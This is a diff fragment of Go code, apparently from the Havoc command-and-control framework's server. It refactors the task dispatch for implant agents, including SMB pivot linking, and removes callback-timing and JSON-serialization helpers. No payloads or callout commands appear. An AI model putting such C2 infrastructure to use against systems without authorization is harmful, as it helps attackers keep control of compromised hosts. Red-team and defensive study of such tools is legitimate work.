@@ -3363,7 +2941,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 								go DemonInfo.BackgroundUpdateLastCallbackUI(Funcs)
 
 								Message["Type"] = "Good"
-								Message["Message"] = "[SMB] Connected to pivot agent [" + demon.NameID + "]-<>-<>-[" + DemonInfo.NameID + "]"
+								Message["Message"] = "[SMB] Connected to pivot agent [" + a.NameID + "]-<>-<>-[" + DemonInfo.NameID + "]"
 							} else {
 								Message["Type"] = "Error"
 								Message["Message"] = "[SMB] Failed to connect: failed to parse the agent"
@@ -3426,9 +3004,9 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 						var Command = AgentHdr.Data.ParseInt32()
 
 						found := false
-						for i := range demon.Pivots.Links {
-							if demon.Pivots.Links[i].NameID == utils.IntToHexString(AgentHdr.AgentID) {
-								demon.Pivots.Links[i].TaskDispatch(Command, AgentHdr.Data, Funcs)
+						for i := range a.Pivots.Links {
+							if a.Pivots.Links[i].NameID == utils.IntToHexString(AgentHdr.AgentID) {
+								a.Pivots.Links[i].TaskDispatch(Command, AgentHdr.Data, Funcs)
 								found = true
 								break
 							}
@@ -3455,84 +3033,8 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			logger.Debug(fmt.Sprintf("CommandID not found: %x", CommandID))
 		}
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 	}
-}
-
-func (demons *Agents) AppendAgent(demon *Agent) []*Agent {
-	demons.Agents = append(demons.Agents, demon)
-	return demons.Agents
-}
-
-func (a *Agent) UpdateLastCallback(routineFunc RoutineFunc) {
-	var (
-		OldLastCallIn, _ = time.Parse("02-01-2006 15:04:05", a.Info.LastCallIn)
-		NewLastCallIn, _ = time.Parse("02-01-2006 15:04:05", time.Now().Format("02-01-2006 15:04:05"))
-	)
-
-	a.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05")
-
-	diff := NewLastCallIn.Sub(OldLastCallIn)
-
-	AgentCallback := make(map[string]string)
-	AgentCallback["Output"] = diff.String()
-	routineFunc.DemonOutput(a.NameID, COMMAND_NOJOB, AgentCallback)
-}
-
-func (a *Agent) BackgroundUpdateLastCallbackUI(routineFunc RoutineFunc) {
-	for {
-		var (
-			OldLastCallIn, _ = time.Parse("02-01-2006 15:04:05", a.Info.LastCallIn)
-			NewLastCallIn, _ = time.Parse("02-01-2006 15:04:05", time.Now().Format("02-01-2006 15:04:05"))
-		)
-
-		diff := NewLastCallIn.Sub(OldLastCallIn)
-
-		AgentCallback := make(map[string]string)
-		AgentCallback["Output"] = diff.String()
-		routineFunc.DemonOutput(a.NameID, COMMAND_NOJOB, AgentCallback)
-
-		time.Sleep(time.Second * 1)
-	}
-}
-
-func (d *Agent) ToMap() map[string]interface{} {
-	var TempParent = d.Pivots.Parent
-	var InfoMap = structs.Map(d)
-
-	d.Pivots.Parent = nil
-
-	InfoMap["Info"].(map[string]interface{})["Listener"] = nil
-
-	delete(InfoMap, "Connection")
-	delete(InfoMap, "SessionDir")
-	delete(InfoMap, "Info")
-	delete(InfoMap, "JobQueue")
-	delete(InfoMap, "Parent")
-
-	var TempMagic = fmt.Sprintf("%x", d.Info.MagicValue)
-
-	if TempParent != nil {
-		InfoMap["PivotParent"] = d.NameID
-	}
-
-	InfoMap["MagicValue"] = TempMagic
-
-	return InfoMap
-}
-
-func (d *Agent) ToJson() string {
-	// TODO: add Agents pivot links too
-
-	jsonBytes, err := json.Marshal(d.ToMap())
-	if err != nil {
-		logger.Error("Failed to marshal object to json: " + err.Error())
-		return ""
-	}
-
-	logger.Debug("jsonBytes =>", string(jsonBytes))
-
-	return string(jsonBytes)
 }
